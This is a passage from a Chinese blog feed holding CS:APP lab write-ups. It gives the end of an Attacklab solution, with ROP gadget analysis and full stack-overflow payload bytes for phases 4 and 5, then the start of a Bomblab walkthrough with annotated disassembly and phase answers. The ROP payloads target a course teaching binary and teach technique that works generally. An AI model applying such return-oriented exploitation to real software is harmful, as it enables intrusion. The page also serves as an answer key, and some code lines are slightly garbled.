class="line">0000000000401a9e &lt;addval_184&gt;:</span><br><span class="line">  401a9e:8d 87 89 c2 60 d2    lea    -0x2d9f3d77(%rdi),%eax</span><br><span class="line">  401aa4:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401aa5 &lt;getval_472&gt;:</span><br><span class="line">  401aa5:b8 8d ce 20 d2       mov    $0xd220ce8d,%eax</span><br><span class="line">  401aaa:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:c7 07 48 89 e0 90    movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401ab2 &lt;end_farm&gt;:</span><br><span class="line">  401ab2:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401ab7:c3                   retq   </span><br><span class="line">  401ab8:90                   nop</span><br><span class="line">  401ab9:90                   nop</span><br><span class="line">  401aba:90                   nop</span><br><span class="line">  401abb:90                   nop</span><br><span class="line">  401abc:90                   nop</span><br><span class="line">  401abd:90                   nop</span><br><span class="line">  401abe:90                   nop</span><br><span class="line">  401abf:90                   nop</span><br></pre></td></tr></table></figure><ol start="2"><li>rdi要如何设置为cookie</li><li>如何跳转到touch2</li></ol><p>我将所有可以用的指令都高亮了出来, 根据提示, 我们只需要只用Figure A和Figure B中的指令即可. 这里能够修改的rdi的只有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov $rax, $rdi</span><br></pre></td></tr></table></figure><p>那问题转到$rax了,再看能修改$rax的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $rsp, $rax </span><br><span class="line">pop $rax</span><br></pre></td></tr></table></figure><p>显然,用pop的概率更大.</p><p>pop是将$rsp当前指向的数据  pop 到 $rax 上, 所以我们可得gaddget如下图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093518556.png" alt="image-20200721093518556"></p><p>知道这些, 我们只用到 rtaget的gaddgets_farm中找到对应的指令字节码即可, 最终可得:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 先填充40个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">&#x2F;* 写入gadgets *&#x2F;</span><br><span class="line">ab 19 40 00 00 00 00 00 &#x2F;* pop $rax *&#x2F;</span><br><span class="line">fa 97 b9 59 00 00 00 00 &#x2F;* cookie *&#x2F;</span><br><span class="line">a2 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">ec 17 40 00 00 00 00 00 &#x2F;* touch2 地址 *&#x2F;</span><br></pre></td></tr></table></figure><h2 id="5-Phase-5"><a href="#5-Phase-5" class="headerlink" title="5. Phase 5"></a>5. Phase 5</h2><p>Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string epresentation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</p><p>To solve Phase 5, you can use gadgets in the region of the code in rtarget demarcated by functions start_farm and end_farm. In addition to the gadgets used in Phase 4, this expanded farm includes the encodings of different movl instructions, as shown in Figure 3C. The byte sequences in this part of the farm also contain 2-byte instructions that serve as functional nops, i.e., they do not change any register or memory values. These include instructions, shown in Figure 3D, such as andb %al,%al, that operate on the low-order bytes of some of the registers but do not change their values.</p><p>这个题目的确是个比较坑的题目, 因为从前文做到现在, 很容易让人联想到, 我所有需要的gaddgets都是依据表格中给出的指令, 然后到farm对比中得到的.  如果你是这样想的, 那肯定是做不出来的了. 因为你会发现, 不论怎么做, 你都无法使rdi指向 cookie的string数据内存地址. </p><p>本题的关键是如下这段代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   retq   </span><br></pre></td></tr></table></figure><p>lea指令, 实现了相加功能, 一旦能实现相加功能, 我们就能使 rdi = cookie 的string内存地址了. 至于为什么, 我们一步步分析.</p><p>本题起始就是phase3的rop版. 回忆下phase3中我们要做的工作的几个关键点:</p><ol><li>cooike的 string ascii码表示</li><li>cooike的string ascii码的存放以及 <strong>存放位置的确定</strong></li><li>rdi指向 string 的存放地址.</li><li>touch3跳转</li></ol><p>回忆以下我们在phase3中是怎么做的?看看下面的示意图.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png" alt="image-20200721091909441"></p><p>从这张图中, 我们可以考虑一下如果运用aop , string到底放在哪里合适? 我们的前提是任何时候都不能覆盖string.</p><p><strong>显然 string 依然应该放内存中的最高位. 因为栈是往下push的.</strong> </p><p>好, 那什么时候跳转到touch3? </p><p>当然是我们确定rdi已经指向了string 内存地址之后.</p><p>所以touch3 应该在 rdi赋值 指令之后.</p><p>现在唯一的问题就剩下, rdi如何赋值?</p><p>这时候就需要逆向思维了, 查看表格, 能够修改rdi的有哪些?</p><p>仅有两条:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $rax, $rdi</span><br><span class="line">movl $eax, $edi</span><br></pre></td></tr></table></figure><p>要知道, mov是将一个寄存器的值直接赋值给另一个寄存器的, 而在本次实验中, stack是随机化的, 我们不可能固定 string 字符串的内存位置, <strong>所以可以使用相对偏移量来做</strong>, 我们能确定的是getbuf函数返回后, $rsp的位置. 那么有:<br>$$<br>cookie_value_address = $rsp + offset<br>$$<br>应该注意到, $rdi一定会在最后被赋值一次, 因为rdi才是函数调用的第一个参数. 那如果去构造上面这个公式呢? 这就又需要逆向思维了?</p><p>谁能修改 rdi? –&gt; rax可以.</p><p>谁能修该 rax? –&gt; rsp 和 pop指令</p><p>rax可以修改谁? –&gt; 可以修改rdi, edx</p><p>edx可以修改谁? –&gt;  可以修改ecx</p><p>ecx可以修改谁? –&gt; 可以修改esi</p><p>再结合前文的lea指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea    (%rdi,%rsi,1),%rax</span><br></pre></td></tr></table></figure><p>rax = rdi + rsi</p><p>这样, 所有的条件都凑齐了.</p><p>画个示意图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721100554201.png" alt="image-20200721100554201"></p><p>于是可以有攻击代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 前0x28个字符填充0x00 *&#x2F;</span><br><span class="line">06 1a 40 00 00 00 00 00 &#x2F;* mov $rsp,$rax *&#x2F;</span><br><span class="line">c5 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">ab 19 40 00 00 00 00 00 &#x2F;* pop $rax *&#x2F;</span><br><span class="line">48 00 00 00 00 00 00 00 &#x2F;* offset *&#x2F;</span><br><span class="line">dd 19 40 00 00 00 00 00 &#x2F;* movl $eax,$edx *&#x2F;</span><br><span class="line">34 1a 40 00 00 00 00 00 &#x2F;* movl $edx,$ecx *&#x2F;</span><br><span class="line">63 1a 40 00 00 00 00 00 &#x2F;* movl $ecx,$esi *&#x2F;</span><br><span class="line">d6 19 40 00 00 00 00 00 &#x2F;* lea (%rdi,%rsi,1),%rax *&#x2F;</span><br><span class="line">a2 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">fa 18 40 00 00 00 00 00 &#x2F;* touch3 地址 *&#x2F;</span><br><span class="line">35 39 62 39 39 37 66 61 00 &#x2F;* cookie value *&#x2F;</span><br></pre></td></tr></table></figure><p>一个小tip: offset不用手算, 最先可以随便设置一个值,gdb debug到进入到我们的注入代码时候, 执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x &#x2F;100xb $rsp</span><br></pre></td></tr></table></figure><p>就可以看到cooike value所在的内存地址, 然后 用这个地址 - $rsp即可得到offset, 最后再修改一次攻击代码即可.</p><h2 id="6-尾语"><a href="#6-尾语" class="headerlink" title="6. 尾语"></a>6. 尾语</h2><p>这一个实验和上一个bomlab实验隔了整整一个月才做, 不过整体坐下来比bomblab简单得多, 总体来说, 加强了gdb调试能力, 加深对函数调用的过程, 了解了一些常用的代码注入攻击手段, 能够帮助我们写出更安全,健壮的代码.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;csapp lab系列：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.ravenxrz.ink/archives/2d758396.html&quot;&gt;Csapp-Datalab 详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.ravenxrz.ink/archives/7915569e.html&quot;&gt;Csapp-Bomblab 题解&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本次lab: Attacklab&lt;/p&gt;
&lt;p&gt;耽误了整整一个月没有做csapp的lab了. 忙着返校,忙着实验室的东西, 今天抽了点时间,总算是完成了第三个实验.&lt;/p&gt;
&lt;p&gt;下面就记录下题解分析吧.&lt;/p&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
      <category term="Attacklab" scheme="https://www.ravenxrz.ink/tags/Attacklab/"/>
    
  </entry>
  
  <entry>
    <title>Csapp-Bomblab题解</title>
    <link href="https://www.ravenxrz.ink/archives/7915569e.html"/>
    <id>https://www.ravenxrz.ink/archives/7915569e.html</id>
    <published>2020-06-21T15:06:10.000Z</published>
    <updated>2020-09-06T07:37:36.748Z</updated>
    
    <content type="html"><![CDATA[<p>今天继续学习csapp.</p><p>前一个lab: <a href="https://www.ravenxrz.ink/archives/2d758396.html">Csapp-Datalab 详解 </a></p><p>本次lab, bomblab.</p><h2 id="0-说明"><a href="#0-说明" class="headerlink" title="0. 说明"></a>0. 说明</h2><p> 这个实验相当好玩, 题如其名, 类似一个拆炸弹的过程. 实验只给了一个可执行文件, 需要学生通过gdb反汇编这个可执行文件, “拆弹”共有6个阶段, 每个阶段需要用户输入一个特定的字符串, 一旦输入错误, 炸弹就会爆炸,程序终止.</p><p>做完整个实验, <strong>学生可以学会如何使用gdb, 能够看懂 gcc所编译出来的汇编代码. 掌握阅读汇编代码的能力.</strong></p><p>gdb的使用可参考: <a href="https://www.ravenxrz.ink/archives/37784c45.html">gdb 调试基础 </a></p><p><strong>本次解释, 均已代码注释+图形解释.</strong></p><p><strong>所有汇编代码, 可通过 objdump -d bomb获得.</strong></p><a id="more"></a><h2 id="1-phase-1"><a href="#1-phase-1" class="headerlink" title="1. phase 1"></a>1. phase 1</h2><p>下面是phase 1的汇编代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">   400ee0:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">   400ee4:   be 00 24 40 00          mov    $0x402400,%esi             ; 0x402400是重点</span><br><span class="line">   400ee9:   e8 4a 04 00 00          callq  401338 &lt;strings_not_equal&gt; ; 根据函数可知, 这里要比较两个字符串是否相同</span><br><span class="line">   400eee:   85 c0                   test   %eax,%eax</span><br><span class="line">   400ef0:   74 05                   je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">   400ef2:   e8 43 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">   400ef7:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">   400efb:   c3                      retq   </span><br></pre></td></tr></table></figure><p>所以,我们需要查看内存地址 0x402400的字符串是什么, 通过 <code>x /100cb 0x402400</code>命令,可得:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621205547340.png" alt="image-20200621205547340"></p><p>找到 <code>\0</code>的位置, 之前所有的字符组成的字符串即为答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br></pre></td></tr></table></figure><h2 id="2-phase-2"><a href="#2-phase-2" class="headerlink" title="2. phase 2"></a>2. phase 2</h2><p>源代码和注释:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:   55                      push   %rbp</span><br><span class="line">  400efd:   53                      push   %rbx</span><br><span class="line">  400efe:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  400f02:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line">  400f05:   e8 52 05 00 00          callq  40145c &lt;read_six_numbers&gt;    ;重点在这个函数, 内部采用sscanf实现</span><br><span class="line">  400f0a:   83 3c 24 01             cmpl   $0x1,(%rsp)                  ;输入的第一值必须为1</span><br><span class="line">  400f0e:   74 20                   je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:   e8 25 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:   eb 19                   jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:   8b 43 fc                mov    -0x4(%rbx),%eax              ; 这里为 x_&#123;i&#125;</span><br><span class="line">  400f1a:   01 c0                   add    %eax,%eax                    ; x_&#123;i&#125;&#x3D;2*x_&#123;i&#125;,将当前值加倍</span><br><span class="line">  400f1c:   39 03                   cmp    %eax,(%rbx)                  ; 这里 为x_&#123;i+1&#125;, </span><br><span class="line">  400f1e:   74 05                   je     400f25 &lt;phase_2+0x29&gt;        ; 要求 x_&#123;i+1&#125; &#x3D; x&#123;i&#125;, 结合这三行代码, 要求为,上一个数的2倍&#x3D;下一个数 </span><br><span class="line">  400f20:   e8 15 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:   48 83 c3 04             add    $0x4,%rbx</span><br><span class="line">  400f29:   48 39 eb                cmp    %rbp,%rbx</span><br><span class="line">  400f2c:   75 e9                   jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:   eb 0c                   jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:   48 8d 5c 24 04          lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:   48 8d 6c 24 18          lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:   eb db                   jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  400f40:   5b                      pop    %rbx</span><br><span class="line">  400f41:   5d                      pop    %rbp</span><br><span class="line">  400f42:   c3                      retq                                                </span><br></pre></td></tr></table></figure><p>这个题的重点有两个:</p><ol><li>函数 read_sim_numers. 内部sscanf实现. 从函数名也可一直,本题要求输入值的数量为6.</li><li>指令地址 0x400f17开始的地方, 结合这里的4行代码, 可以推断,本题要求输入值的约束为:</li></ol><p>$$<br>x_{i} \times 2 = x_{i+1} \quad i = {0\dots5}<br>$$</p><p>且 0x400f0a要求第一个参数为1.</p><p>所以,答案为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 2 4 8 16 32 64</span><br></pre></td></tr></table></figure><h2 id="3-phase-3"><a href="#3-phase-3" class="headerlink" title="3. phase 3"></a>3. phase 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">  400f47:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:   be cf 25 40 00          mov    $0x4025cf,%esi</span><br><span class="line">  400f56:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400f5b:   e8 90 fc ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:   83 f8 01                cmp    $0x1,%eax            ; 输入参数的数量应该&gt;1</span><br><span class="line">  400f63:   7f 05                   jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:   e8 d0 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:   83 7c 24 08 07          cmpl   $0x7,0x8(%rsp)       ; 0x80(rsp)地址空间的value : 0x7</span><br><span class="line">  400f6f:   77 3c                   ja     400fad &lt;phase_3+0x6a&gt; ; 是否符号小</span><br><span class="line">  400f71:   8b 44 24 08             mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:   ff 24 c5 70 24 40 00    jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:   b8 cf 00 00 00          mov    $0xcf,%eax</span><br><span class="line">  400f81:   eb 3b                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:   b8 c3 02 00 00          mov    $0x2c3,%eax</span><br><span class="line">  400f88:   eb 34                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:   b8 00 01 00 00          mov    $0x100,%eax</span><br><span class="line">  400f8f:   eb 2d                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:   b8 85 01 00 00          mov    $0x185,%eax</span><br><span class="line">  400f96:   eb 26                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:   b8 ce 00 00 00          mov    $0xce,%eax</span><br><span class="line">  400f9d:   eb 1f                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:   b8 aa 02 00 00          mov    $0x2aa,%eax</span><br><span class="line">  400fa4:   eb 18                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:   b8 47 01 00 00          mov    $0x147,%eax</span><br><span class="line">  400fab:   eb 11                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:   e8 88 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400fb7:   eb 05                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:   b8 37 01 00 00          mov    $0x137,%eax          </span><br><span class="line">  400fbe:   3b 44 24 0c             cmp    0xc(%rsp),%eax       ; 0x137 : 0x($rsp) , 通过x打印命令,可知0x($rsp)就是要求输入的第二参数</span><br><span class="line">  400fc2:   74 05                   je     400fc9 &lt;phase_3+0x86&gt; ; 所以第二参数为0x137</span><br><span class="line">  400fc4:   e8 71 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  400fcd:   c3                      retq </span><br></pre></td></tr></table></figure><p>这里注意三个点:</p><ol><li>输入的字段数&gt;1</li><li>第二个参数为0x137, 在指令地址为0x400fbe地方可见.</li></ol><p>答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 311</span><br></pre></td></tr></table></figure><h2 id="4-phase-4"><a href="#4-phase-4" class="headerlink" title="4. phase 4"></a>4. phase 4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">   400fce:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">   400fd2:   89 d0                   mov    %edx,%eax</span><br><span class="line">   400fd4:   29 f0                   sub    %esi,%eax            ; 第一次, eax&#x3D;17; 第二次进入, </span><br><span class="line">   400fd6:   89 c1                   mov    %eax,%ecx            ; 第一次进入时, ecx &#x3D; 14</span><br><span class="line">   400fd8:   c1 e9 1f                shr    $0x1f,%ecx           ; 第一次进入时, ecx &#x3D; 0</span><br><span class="line">   400fdb:   01 c8                   add    %ecx,%ea</span><br><span class="line">   400fdd:   d1 f8                   sar    %eax                 ; 第一次进入时, ecx &#x3D; 7</span><br><span class="line">   400fdf:   8d 0c 30                lea    (%rax,%rsi,1),%ecx   ; 第一次进入时, ecx &#x3D; 7</span><br><span class="line">   400fe2:   39 f9                   cmp    %edi,%ecx            ; ecx : edi</span><br><span class="line">   400fe4:   7e 0c                   jle    400ff2 &lt;func4+0x24&gt;  ; ecx &lt;&#x3D; edi</span><br><span class="line">   400fe6:   8d 51 ff                lea    -0x1(%rcx),%edx      ; 第一次进入,ecdx &#x3D; 6</span><br><span class="line">   400fe9:   e8 e0 ff ff ff          callq  400fce &lt;func4&gt;       ; 递归调用</span><br><span class="line">   400fee:   01 c0                   add    %eax,%eax            </span><br><span class="line">   400ff0:   eb 15                   jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">   400ff2:   b8 00 00 00 00          mov    $0x0,%eax           ; eax  &#x3D; 0 </span><br><span class="line">   400ff7:   39 f9                   cmp    %edi,%ecx           ; ecx : edi</span><br><span class="line">   400ff9:   7d 0c                   jge    401007 &lt;func4+0x39&gt; ; ecx &gt;&#x3D; edi 结合上面 ecx &lt;&#x3D;edi &#x3D;&#x3D;&gt; ecx &#x3D; edi, 最后一层应该在这里返回, 而前文已经推断得到ecx&#x3D;7</span><br><span class="line">   400ffb:   8d 71 01                lea    0x1(%rcx),%esi</span><br><span class="line">   400ffe:   e8 cb ff ff ff          callq  400fce &lt;func4&gt;</span><br><span class="line">   401003:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax    ; 最后一层返回eax时,eax 应该&#x3D;0</span><br><span class="line">   401007:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">   40100b:   c3                      retq</span><br><span class="line">   </span><br><span class="line"> 000000000040100c &lt;phase_4&gt;:</span><br><span class="line">   40100c:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">   401010:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">   401015:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">   40101a:   be cf 25 40 00          mov    $0x4025cf,%esi</span><br><span class="line">   40101f:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">   401024:   e8 c7 fb ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   401029:   83 f8 02                cmp    $0x2,%eax            ; 需要输入2个参数</span><br><span class="line">   40102c:   75 07                   jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">   40102e:   83 7c 24 08 0e          cmpl   $0xe,0x8(%rsp)</span><br><span class="line">   401033:   76 05                   jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">   401035:   e8 00 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">   40103a:   ba 0e 00 00 00          mov    $0xe,%edx            ; 构造函数参数3</span><br><span class="line">   40103f:   be 00 00 00 00          mov    $0x0,%esi            ; 构造函数参数2</span><br><span class="line">   401044:   8b 7c 24 08             mov    0x8(%rsp),%edi       ; 构造函数参数1 edi&#x3D;输入的第一个参数</span><br><span class="line">   401048:   e8 81 ff ff ff          callq  400fce &lt;func4&gt;       ; 进入func4函数</span><br><span class="line">   40104d:   85 c0                   test   %eax,%eax            ; 这行和下一行,要求func4返回的参数一定等于0</span><br><span class="line">   40104f:   75 07                   jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">   401051:   83 7c 24 0c 00          cmpl   $0x0,0xc(%rsp)       ; 第二参数为0</span><br><span class="line">   401056:   74 05                   je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">   401058:   e8 dd 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">   40105d:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">   401061:   c3                      retq</span><br></pre></td></tr></table></figure><p>这是一个递归题目, 难点在参数1, 参数2的确定非常简单,直接为0.</p><p>而参数1,则需要带入到代码中,还原递归的过程.</p><p>还原为递归代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = z - y;</span><br><span class="line">    <span class="keyword">int</span> k = t  <span class="number">31</span>;</span><br><span class="line">    t = (t + k)  <span class="number">1</span>;</span><br><span class="line">    k = t + y;</span><br><span class="line">    <span class="keyword">if</span>(k &lt;= x) &#123;</span><br><span class="line">        t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(k &gt;= x) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            y = k + <span class="number">1</span>;</span><br><span class="line">            func4(x, y, z);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        z = k - <span class="number">1</span>;</span><br><span class="line">        func4(x, y, z);</span><br><span class="line">    &#125;</span><br><span 